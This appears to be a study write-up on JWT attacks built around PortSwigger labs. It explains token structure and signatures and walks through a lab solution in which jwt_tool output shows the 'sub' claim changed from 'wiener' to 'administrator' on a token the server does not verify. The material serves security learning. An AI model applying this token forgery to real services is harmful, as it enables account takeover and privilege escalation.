# JWT Attacks

## References

- [JWT Attacks - PortSwigger](https://portswigger.net/web-security/jwt)
- [JWT Vulnerabilities - HackTricks](https://book.hacktricks.xyz/pentesting-web/hacking-jwt-json-web-tokens)
- [Pentest JWT Token (Playlist) - AulasHack](https://odysee.com/$/playlist/1b7dc3665c5cf1c05af4d0e56fd30d94031af8ba)

## Labs

- [JWT Vulnerabilities Labs - PortSwigger](https://portswigger.net/web-security/all-labs#jwt)

## Useful Tools

- [jwt.io](https://jwt.io/)
- [jwt_tool - Github](https://github.com/ticarpi/jwt_tool)

## Resume

###  What are JWT Tokens?

​            JSON web tokens (JWTs) are a standardized format for sending cryptographically signed JSON data between systems. They can  theoretically contain any kind of data, but are most commonly used to  send information ("claims") about users as part of authentication,  session handling, and access control mechanisms.        

​            Unlike with classic session tokens, all of the data that a  server needs is stored client-side within the JWT itself. This makes  JWTs a popular choice for highly distributed websites where users need  to interact seamlessly with multiple back-end servers.        

### JWT format

​            A JWT consists of 3 parts: a header, a payload, and a signature. These are each separated by a dot, as shown in the following example:        

```
eyJraWQiOiI5MTM2ZGRiMy1jYjBhLTRhMTktYTA3ZS1lYWRmNWE0NGM4YjUiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTY0ODAzNzE2NCwibmFtZSI6IkNhcmxvcyBNb250b3lhIiwic3ViIjoiY2FybG9zIiwicm9sZSI6ImJsb2dfYXV0aG9yIiwiZW1haWwiOiJjYXJsb3NAY2FybG9zLW1vbnRveWEubmV0IiwiaWF0IjoxNTE2MjM5MDIyfQ.SYZBPIBg2CRjXAJ8vCER0LA_ENjII1JakvNQoP-Hw6GG1zfl4JyngsZReIfqRvIAEi5L4HV0q7_9qGhQZvy9ZdxEJbwTxRs_6Lb-fZTDpW6lKYNdMyjw45_alSCZ1fypsMWz_2mTpQzil0lOtps5Ei_z7mM7M8gCwe_AGpI53JxduQOaB5HkT5gVrv9cKu9CsW5MS6ZbqYXpGyOG5ehoxqm8DL5tFYaW3lB50ELxi0KsuTKEbD0t5BCl0aCR2MBJWAbN-xeLwEenaqBiwPVvKixYleeDQiBEIylFdNNIMviKRgXiYuAvMziVPbwSgkZVHeEdF5MQP1Oe2Spac-6IfA
```

​            The header and payload parts of a JWT are just  base64url-encoded JSON objects. The header contains metadata about the  token itself, while the payload contains the actual "claims" about the  user. For example, you can decode the payload from the token above to  reveal the following claims:        

```json
{
  "iss": "portswigger",
  "exp": 1648037164,
  "name": "Carlos Montoya",
  "sub": "carlos",
  "role": "blog_author",
  "email": "carlos@carlos-montoya.net",
  "iat": 1516239022
}
```

​            In most cases, this data can be easily read or modified by  anyone with access to the token. Therefore, the security of any  JWT-based mechanism is heavily reliant on the cryptographic signature.        

### JWT signature

​            The server that issues the token typically generates the  signature by hashing the header and payload. In some cases, they also  encrypt the resulting hash. Either way, this process involves a secret  signing key. This mechanism provides a way for servers to verify that  none of the data within the token has been tampered with since it was  issued:        

- As the signature is directly derived from the rest  of the token, changing a single byte of the header or payload results in a mismatched signature.                
- Without knowing the server's secret signing key, it  shouldn't be possible to generate the correct signature for a given  header or payload.                

### What are JWT attacks and what are the impacts?

​            JWT attacks involve a user sending modified JWTs to the  server in order to achieve a malicious goal. Typically, this goal is to  bypass authentication and access controls by impersonating another user  who has already been authenticated.        

The impact of JWT attacks is usually severe. If an attacker is able to  create their own valid tokens with arbitrary values, they may be able to escalate their own privileges or impersonate other users, taking full  control of their accounts. 

## Vulnerabilities

### JWT authentication bypass via unverified signature

**Resources:**

- **Lab:** https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-unverified-signature
- **AulasHack Video Resolution:** https://odysee.com/@AulasHack:4/jwt-authentication-bypass-via-unverified:6?lid=1b7dc3665c5cf1c05af4d0e56fd30d94031af8ba

**Explanation:** 

​            By design, servers don't usually store any information about the JWTs that they issue. Instead, each token is an entirely  self-contained entity. This has several advantages, but also introduces a fundamental problem - the server doesn't actually know anything about  the original contents of the token, or even what the original signature  was. Therefore, if the server doesn't verify the signature properly,  there's nothing to stop an attacker from making arbitrary changes to the rest of the token.        

​            For example, consider a JWT containing the following claims:        

```json
{    
	"username": "carlos",    
	"isAdmin": false 
}
```

​            If the server identifies the session based on this `username`, modifying its value might enable an attacker to impersonate other logged-in users. Similarly, if the `isAdmin` value is used for access control, this could provide a simple vector for privilege escalation.        

​            In the first couple of labs, you'll see some examples of how these vulnerabilities might look in real-world applications.       

**Resolution:**

1. Login at **wiener** account, collect and analyse the JWT Tokent at **jwt.io** or **jwt_tool**.

```bash
└─$ python3 jwt_tool.py eyJraWQiOiI3YTQ4NjQ2YS0yMTgwLTRkOGUtYTA1YS00MjJhOTlkOWFjNzEiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTcxNDQyNTc4Nywic3ViIjoid2llbmVyIn0.cGCHsE9vb_hFeQQ47dlwUqBZd6jlzjoyGMKxFVGvKLh3WKG42j0JiPCDJU5be97aMdzFXcw2FfWwQdBMWbeSVBouqy4Hep5FeI9K5XfyA-tOpSYkbLZlyslRsnyOmb1VokHOrhJpHNdWSUK94fvQMuyucw832oJmi1Z7voKkjHCPpyIywHy8MCOYz0xzB7BNteZviV776Seo_OA5hJT4y2r-Iur7hkyHXhVlU4ORWx62hQb546aIdzRuQDbh1zbzvOmiVlySuwZgNfT_56Uh2i-JTo18AjadGrTD0ZIIG2aGnjAD0ZZkaK6LvDaI6lR_NyJteJJQR54ffC17KoibJg   

        \   \        \         \          \                    \ 
   \__   |   |  \     |\__    __| \__    __|                    |
         |   |   \    |      |          |       \         \     |
         |        \   |      |          |    __  \     __  \    |
  \      |      _     |      |          |   |     |   |     |   |
   |     |     / \    |      |          |   |     |   |     |   |
\        |    /   \   |      |          |\        |\        |   |
 \______/ \__/     \__|   \__|      \__| \______/  \______/ \__|
 Version 2.2.6                \______|             @ticarpi      

Original JWT: 
                                                                                                                                                                                             
=====================
Decoded Token Values:                                                                                                                                                                        
=====================                                                                                                                                                                        

Token header values:                                                                                                                                                                         
[+] kid = "7a48646a-2180-4d8e-a05a-422a99d9ac71"
[+] alg = "RS256"

Token payload values:                                                                                                                                                                        
[+] iss = "portswigger"
[+] exp = 1714425787    ==> TIMESTAMP = 2024-04-29 18:23:07 (UTC)
[+] sub = "wiener"

----------------------                                                                                                                                                                       
JWT common timestamps:                                                                                                                                                                       
iat = IssuedAt                                                                                                                                                                               
exp = Expires                                                                                                                                                                                
nbf = NotBefore                                                                                                                                                                              
----------------------
```

2. Tamper value "wiener" to the "administrator" value using **jwt_tool**.

```bash
─$ python3 jwt_tool.py eyJraWQiOiI3YTQ4NjQ2YS0yMTgwLTRkOGUtYTA1YS00MjJhOTlkOWFjNzEiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTcxNDQyNDQzMiwic3ViIjoid2llbmVyIn0.E_zbMx5P-9T3BbNH8klnEapTlbYpRcYe88NJURL-RM96BSYdnxTZJYhwmcN6lFND_Gj8SijMtBVqWBOmyCE6Mo1Qd58qRwE_tgmBNRAQNexXE1FwjQIBiof0rS_sdoP9D8oTqvTNHy80Wn1YLaB6pdah1yQnl7gTU8mfTolD0dyxVjwUyPjm3OJ7AbPQQYSfPVj93p2VXevDBTSikLphB7_OiiE8ywJSLCAu7_qX2TK0c31RVLjGrPlw-f5Ec3MYEjIY_GAJHMXflgmhCW83Z6AjDmhiClhVEfZ8v1bPQ0m1dUegMHTV7_RwaPanrBmai7EtB_P_OjocF8jwCUu2fg -T

        \   \        \         \          \                    \ 
   \__   |   |  \     |\__    __| \__    __|                    |
         |   |   \    |      |          |       \         \     |
         |        \   |      |          |    __  \     __  \    |
  \      |      _     |      |          |   |     |   |     |   |
   |     |     / \    |      |          |   |     |   |     |   |
\        |    /   \   |      |          |\        |\        |   |
 \______/ \__/     \__|   \__|      \__| \______/  \______/ \__|
 Version 2.2.6                \______|             @ticarpi      

Original JWT: 
                                                                                                                                                                                             

====================================================================                                                                                                                         
This option allows you to tamper with the header, contents and                                                                                                                               
signature of the JWT.                                                                                                                                                                        
====================================================================                                                                                                                         

Token header values:                                                                                                                                                                         
[1] kid = "7a48646a-2180-4d8e-a05a-422a99d9ac71"
[2] alg = "RS256"
[3] *ADD A VALUE*
[4] *DELETE A VALUE*
[0] Continue to next step

Please select a field number:                                                                                                                                                                
(or 0 to Continue)                                                                                                                                                                           
> 0

Token payload values:                                                                                                                                                                        
[1] iss = "portswigger"
[2] exp = 1714424432    ==> TIMESTAMP = 2024-04-29 18:00:32 (UTC)
[3] sub = "wiener"
[4] *ADD A VALUE*
[5] *DELETE A VALUE*
[6] *UPDATE TIMESTAMPS*
[0] Continue to next step

Please select a field number:                                                                                                                                                                
(or 0 to Continue)                                                                                                                                                                           
> 4
Please enter new Key and hit ENTER
> sub
Please enter new value for sub and hit ENTER
> administrator
[1] iss = "portswigger"
[2] exp = 1714424432    ==> TIMESTAMP = 2024-04-29 18:00:32 (UTC)
[3] sub = "administrator"
[4] *ADD A VALUE*
[5] *DELETE A VALUE*
[6] *UPDATE TIMESTAMPS*
[0] Continue to next step

Please select a field number:                                                                                                                                                                
(or 0 to Continue)                                                                                                                                                                           
> 0
Signature unchanged - no signing method specified (-S or -X)
jwttool_084845f9c257880a92a7af8fae9224c1 - Tampered token:
[+] eyJraWQiOiI3YTQ4NjQ2YS0yMTgwLTRkOGUtYTA1YS00MjJhOTlkOWFjNzEiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTcxNDQyNDQzMiwic3ViIjoiYWRtaW5pc3RyYXRvciJ9.E_zbMx5P-9T3BbNH8klnEapTlbYpRcYe88NJURL-RM96BSYdnxTZJYhwmcN6lFND_Gj8SijMtBVqWBOmyCE6Mo1Qd58qRwE_tgmBNRAQNexXE1FwjQIBiof0rS_sdoP9D8oTqvTNHy80Wn1YLaB6pdah1yQnl7gTU8mfTolD0dyxVjwUyPjm3OJ7AbPQQYSfPVj93p2VXevDBTSikLphB7_OiiE8ywJSLCAu7_qX2TK0c31RVLjGrPlw-f5Ec3MYEjIY_GAJHMXflgmhCW83Z6AjDmhiClhVEfZ8v1bPQ0m1dUegMHTV7_RwaPanrBmai7EtB_P_OjocF8jwCUu2fg
```

